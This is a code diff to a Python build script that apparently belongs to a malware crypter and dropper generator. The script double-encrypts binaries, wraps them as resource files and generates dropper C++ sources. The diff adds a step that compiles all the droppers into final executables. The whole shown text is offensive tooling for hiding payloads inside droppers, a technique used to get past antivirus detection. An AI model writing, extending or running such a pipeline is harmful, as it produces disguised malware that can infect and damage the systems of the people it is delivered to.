@@ -9,13 +9,15 @@ import CreateCrypt #creates an encrypt and decrypt function
 #saves to generated/crypt
 import CreateDropper
 import GenerateRES
+import BuildExes
 #make sure all needed folders are here
 base_dirs = {
     "crypt": "generated/crypt",
     "encrypted_binaries": "generated/encrypted_binaries",
     "double_encrypted_binaries": "generated/double_encrypted_binaries",
     "resfiles": "generated/resfiles",
-    "Generated_DropperCPPfiles": "generated/Generated_DropperCPPfiles"
+    "Generated_DropperCPPfiles": "generated/Generated_DropperCPPfiles",
+    "finalexes": "generated/finalexes"
 }
 
 # Ensure all folders exist
@@ -105,11 +107,11 @@ else:
     print(f"✅ Second encryption ran successfully:\n{result.stdout}")
 
 print("Second encryptor used:", cpp_file2)
-                                                                                                                #3 make the res.rc folders
+                                                                                                                        #3 make the res.rc folders
 GenerateRES.generate_all_resources("generated/double_encrypted_binaries","generated/resfiles" )
 
 # Iterate over all .rc files
-for rc_file in os.listdir("generated/resfiles"):
+for rc_file in os.listdir("generated/resfiles"):                                                                        #4 make all the droppers
     if rc_file.endswith(".rc"):
         base_name = os.path.splitext(rc_file)[0]  # e.g., "file1"
         dropper_cpp_path = os.path.join("generated/Generated_DropperCPPfiles", f"{base_name}.cpp")
@@ -134,3 +136,5 @@ for rc_file in os.listdir("generated/resfiles"):
 
         # Call CreateDropper on the newly created CPP
         CreateDropper.create_dropper(dropper_cpp_path, cpp_file1, cpp_file2, key, key)
+
+BuildExes.build_all("generated/Generated_DropperCPPfiles", "generated/resfiles","generated/finalexes")                    # compile all the droppers with their needed res
